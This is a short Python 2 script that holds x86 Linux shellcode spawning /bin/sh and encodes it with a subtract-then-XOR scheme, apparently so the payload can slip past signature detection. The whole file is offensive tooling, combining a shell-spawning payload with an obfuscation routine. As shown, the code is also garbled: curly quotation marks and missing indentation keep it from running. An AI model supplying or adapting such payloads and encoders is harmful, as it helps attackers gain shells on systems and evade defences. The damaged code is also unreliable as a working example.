#!/usr/bin/python
import sys

shellcode = (“\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80″)
encoded = []
original = []

print ‘\n\nEncoding shellcode …’

for x in bytearray(shellcode) :
original.append(hex(x))
f = x + -2
y = f ^ 0xAA
print x,”—->>”, y
encoded.append(hex(y))

print “\nOriginal:”

for i in original:
sys.stdout.write(i)
sys.stdout.write(‘,’)

print “\n\nEncoded:”

for i in encoded:
sys.stdout.write(i)
sys.stdout.write(‘,’)

print ‘\nLen: %d’ % len(bytearray(shellcode))
